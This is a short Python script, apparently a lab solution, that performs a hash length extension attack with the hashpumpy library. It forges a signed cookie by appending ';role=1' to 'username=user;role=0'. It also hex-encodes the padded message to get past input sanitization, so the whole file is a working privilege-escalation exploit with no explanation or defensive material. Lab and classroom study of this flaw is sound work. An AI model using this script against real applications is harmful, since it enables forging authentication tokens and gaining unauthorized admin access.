import hashpumpy
import urllib.parse

# Intercepted values from Lab 2
original_sig = "bfe0fa5c36531773c73dcc8d2a931301f69cf9add05a1f35dcfa2d48b44c37f0"
original_data = "username=user;role=0"
data_to_append = ";role=1"
secret_len = 8

# Generate the new hash and padded message
new_hash, new_message = hashpumpy.hashpump(
    original_sig, 
    original_data, 
    data_to_append, 
    secret_len
)

# Hex-encode the message to ensure the padding bypasses sanitization
payload = "".join("%{0:02x}".format(b) for b in new_message)

print(f"hsh (Signature): {new_hash}")
print(f"auth (Cookie Data): {payload}")
